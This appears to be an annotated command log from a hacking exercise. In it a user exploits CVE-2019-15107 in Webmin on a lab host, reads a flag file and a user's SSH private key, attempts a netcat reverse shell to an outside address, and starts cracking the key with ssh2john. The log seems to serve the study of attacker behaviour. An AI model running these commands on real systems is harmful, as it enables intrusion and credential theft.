INPUT|85--23|A13 |1594800368|85|python CVE_2019_15107.py https://172.18.1.5:10000|OUTPUT
INPUT|85--24|A13 |1594800386|85|python CVE_2019_15107.py https://172.18.1.5:10000 id|OUTPUT
INPUT|85--25|A10 A13 |1594800477|85|python CVE_2019_15107.py http://172.18.1.5:10000 ls|OUTPUT
INPUT|85--26|A13 |1594800504|85|python CVE_2019_15107.py http://172.18.1.5:10000 pwd|OUTPUT
INPUT|85--27|A10 |1594800515|85|ls /root|OUTPUT
INPUT|85--28|A10 A13 |1594800525|85|python CVE_2019_15107.py http://172.18.1.5:10000 ls /root|OUTPUT
INPUT|85--29|A10 A13 |1594800540|85|python CVE_2019_15107.py http://172.18.1.5:10000 ls /root/|OUTPUT
INPUT|85--30|A10 A13 |1594800547|85|python CVE_2019_15107.py http://172.18.1.5:10000 ls /root/; pwd|OUTPUT
INPUT|85--31|A13 |1594800560|85|python CVE_2019_15107.py http://172.18.1.5:10000 cd /root/; pwd|OUTPUT
INPUT|85--32|A10 A13 |1594800565|85|python CVE_2019_15107.py http://172.18.1.5:10000 cd /root/; ls|OUTPUT
INPUT|85--33|A10 A13 |1594800572|85|python CVE_2019_15107.py http://172.18.1.5:10000 cd /root/; ls|OUTPUT
INPUT|85--34|M10 |1594800585|85|python CVE_2019_15107.py http://172.18.1.5:10000 cd /root/; ls -al|OUTPUT
INPUT|85--35|A10 A13 |1594800601|85|python CVE_2019_15107.py http://172.18.1.5:10000 ls /root/;|OUTPUT
INPUT|85--36|A10 A13 |1594800630|85|python CVE_2019_15107.py http://172.18.1.5:10000 ls /root/ pwd;|OUTPUT
INPUT|85--37|M10 |1594800642|85|python CVE_2019_15107.py http://172.18.1.5:10000 ls -al /root/;|OUTPUT
INPUT|85--38|A10 A13 |1594800707|85|python CVE_2019_15107.py http://172.18.1.5:10000 bash -c 'cd /root; ls';|OUTPUT
INPUT|85--39|M10 |1594800712|85|python CVE_2019_15107.py http://172.18.1.5:10000 bash -c 'cd /root; ls -al';|OUTPUT
INPUT|85--40|A13 |1594800718|85|python CVE_2019_15107.py http://172.18.1.5:10000 bash -c 'cd /root; pwd';|OUTPUT
INPUT|85--41|A10 A13 |1594800730|85|python CVE_2019_15107.py http://172.18.1.5:10000 bash -c 'ls';|OUTPUT
INPUT|85--42|A13 |1594800734|85|python CVE_2019_15107.py http://172.18.1.5:10000 bash -c 'pwd';|OUTPUT
INPUT|85--43|A13 |1594800737|85|python CVE_2019_15107.py http://172.18.1.5:10000 bash -c 'pwd'|OUTPUT
INPUT|85--44|A13 |1594800785|85|python CVE_2019_15107.py http://172.18.1.5:10000 /bin/bash -c 'echo anal'|OUTPUT
INPUT|85--45|A13 |1594800795|85|python CVE_2019_15107.py http://172.18.1.5:10000 pwd|OUTPUT
INPUT|85--46|A13 |1594800807|85|python CVE_2019_15107.py http://172.18.1.5:10000 cd /root|OUTPUT
INPUT|85--47|A10 A13 |1594800873|85|python CVE_2019_15107.py http://172.18.1.5:10000 cd /root/ & ls|OUTPUT
INPUT|85--48|A13 |1594800886|85|python CVE_2019_15107.py http://172.18.1.5:10000 cd /root/|OUTPUT
INPUT|85--49|A13 |1594800905|85|python CVE_2019_15107.py http://172.18.1.5:10000 cd /root/ & echo hello|OUTPUT
INPUT|85--50|A13 |1594800933|85|python CVE_2019_15107.py http://172.18.1.5:10000 'cd /root/ & echo hello'|OUTPUT
INPUT|85--51|A13 |1594800943|85|python CVE_2019_15107.py http://172.18.1.5:10000 'cd /root/ && echo hello'|OUTPUT
INPUT|85--52|A13 |1594800968|85|python CVE_2019_15107.py http://172.18.1.5:10000 'cd /root/ && pwd'|OUTPUT
INPUT|85--53|A13 |1594800979|85|python CVE_2019_15107.py http://172.18.1.5:10000 cd /root/ && pwd|OUTPUT
INPUT|85--54|A1 A9 A11 A12 A13 A17 |1594801021|85|python CVE_2019_15107.py http://172.18.1.5:10000 cat /root/flag|OUTPUT
INPUT|85--55|A13 |1594801031|85|python CVE_2019_15107.py http://172.18.1.5:10000 pwd|OUTPUT
INPUT|85--56|A13 |1594801045|85|python CVE_2019_15107.py http://172.18.1.5:10000 cd /root/|OUTPUT
INPUT|85--57|A13 |1594801063|85|python CVE_2019_15107.py http://172.18.1.5:10000 pwd|OUTPUT
INPUT|85--58|A13 |1594801073|85|python CVE_2019_15107.py http://172.18.1.5:10000 touch file|OUTPUT
INPUT|85--59|A10 A13 |1594801087|85|python CVE_2019_15107.py http://172.18.1.5:10000 ls /root/ > file|OUTPUT
INPUT|85--60|A1 A9 A11 A12 A13 A17 |1594801095|85|python CVE_2019_15107.py http://172.18.1.5:10000 cat file|OUTPUT
INPUT|85--61|A10 A13 |1594801110|85|python CVE_2019_15107.py http://172.18.1.5:10000 ls|OUTPUT
INPUT|85--62|A10 |1594801146|85|ls|OUTPUT
INPUT|85--63|A13 |1594801171|85|python CVE_2019_15107.py http://172.18.1.5:10000 pwd|OUTPUT
INPUT|85--64|A10 A13 |1594801190|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls /root'|OUTPUT
INPUT|85--65|M9 |1594801207|85|python CVE_2019_15107.py http://172.18.1.5:10000 'cat /root/WARNING-READ-ME.txt'|OUTPUT
INPUT|85--66|A10 A13 |1594801414|85|python CVE_2019_15107.py http://172.18.1.5:10000 'find *.txt'|OUTPUT
INPUT|85--67|A13 |1594801469|85|python CVE_2019_15107.py http://172.18.1.5:10000 'cd /root/ && pwd'|OUTPUT
INPUT|85--68|A13 |1594801474|85|python CVE_2019_15107.py http://172.18.1.5:10000 'cd /root/; pwd'|OUTPUT
INPUT|85--69|A13 |1594801479|85|python CVE_2019_15107.py http://172.18.1.5:10000 'cd /root; pwd'|OUTPUT
INPUT|85--70|A10 A13 |1594801501|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls /'|OUTPUT
INPUT|85--71|A10 A13 |1594801511|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls /home'|OUTPUT
INPUT|85--72|A10 A13 |1594801520|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls /home/alive'|OUTPUT
INPUT|85--73|M10 |1594801527|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls -al /home/alice'|OUTPUT
INPUT|85--74|M10 |1594801535|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls -al /home/bob'|OUTPUT
INPUT|85--75|M10 |1594801540|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls -al /home/eve'|OUTPUT
INPUT|85--76|M10 |1594801564|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls /home/eve/.ssh'|OUTPUT
INPUT|85--77|M12 |1594801582|85|python CVE_2019_15107.py http://172.18.1.5:10000 'cat /home/eve/.ssh/id_rsa'|OUTPUT
INPUT|85--78|M10 |1594801612|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls /home/eve/.ssh'|OUTPUT
INPUT|85--79|M12 |1594801619|85|python CVE_2019_15107.py http://172.18.1.5:10000 'cat /home/eve/.ssh/id_rsa.pub'|OUTPUT
INPUT|85--80|A10 |1594801642|85|ls|OUTPUT
INPUT|85--81|A10 A13 |1594801664|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls /home'|OUTPUT
INPUT|85--82|A10 A13 |1594801671|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls /home/debian'|OUTPUT
INPUT|85--83|M10 |1594801681|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls -al /home/debian'|OUTPUT
INPUT|85--84|M10 |1594801692|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls -al /home/debian/.ansible'|OUTPUT
INPUT|85--85|M10 |1594801698|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls -al /home/debian/.ansible/tmp'|OUTPUT
INPUT|85--86|M10 |1594801729|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls -al /'|OUTPUT
INPUT|85--87|M10 |1594801742|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls -al /root'|OUTPUT
INPUT|85--88|A10 A13 |1594801820|85|python CVE_2019_15107.py http://172.18.1.5:10000 'find -L / *.txt'|OUTPUT
INPUT|85--89|M10 |1594801842|85|python CVE_2019_15107.py http://172.18.1.5:10000 'find -L / -name *.txt'|OUTPUT
INPUT|85--90|A10 |1594802102|85|ls|OUTPUT
INPUT|85--91|A10 A13 |1594802114|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls /root'|OUTPUT
INPUT|85--92|A10 A13 |1594802121|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls /'|OUTPUT
INPUT|85--93|M10 |1594802132|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls -al /home'|OUTPUT
INPUT|85--94|A10 A13 |1594802226|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls /home'|OUTPUT
INPUT|85--95|A10 A13 |1594802232|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls /home'|OUTPUT
INPUT|85--96|U|1594802243|85|ping 172.18.1.5|OUTPUT
INPUT|85--97|A13 |1594802254|85|python CVE_2019_15107.py http://172.18.1.5:10000 'pwd'|OUTPUT
INPUT|85--98|U|1594802441|85|nc -l 8080|OUTPUT
INPUT|85--99|A13 |1594802505|85|python CVE_2019_15107.py http://172.18.1.5:10000 'nc -e /bin/sh 10.1.135.83 8080'|OUTPUT
INPUT|85--100|A13 |1594804760|85|python CVE_2019_15107.py http://172.18.1.5:10000 'nc -e /bin/sh 10.1.135.83 8080'|OUTPUT
INPUT|85--101|A10 |1594804764|85|ls|OUTPUT
INPUT|85--102|U|1594804768|85|cd CVE-2019-15107/|OUTPUT
INPUT|85--103|A13 |1594804771|85|python CVE_2019_15107.py http://172.18.1.5:10000 'nc -e /bin/sh 10.1.135.83 8080'|OUTPUT
INPUT|85--104|A10 |1594805091|85|ls|OUTPUT
INPUT|85--105|U|1594805093|85|cd CVE-2019-15107/|OUTPUT
INPUT|85--106|A13 |1594805096|85|python CVE_2019_15107.py http://172.18.1.5:10000 'nc -e /bin/sh 10.1.135.83 8080'|OUTPUT
INPUT|85--107|U|1594805361|85|aaaaaaaaaaa|OUTPUT
INPUT|85--108|U|1594805365|85|ive had enough|OUTPUT
INPUT|85--109|U|1594805367|85|help|OUTPUT
INPUT|85--110|U|1594805372|85|please|OUTPUT
INPUT|85--111|U|1594805373|85|i beg you|OUTPUT
INPUT|85--112|U|1594805380|85|to je tak na picu lmao|OUTPUT
INPUT|85--113|U|1594805691|85|cd ..|OUTPUT
INPUT|85--114|A10 |1594805693|85|ls|OUTPUT
INPUT|85--115|M13 |1594805698|85|python ssh2john.py|OUTPUT
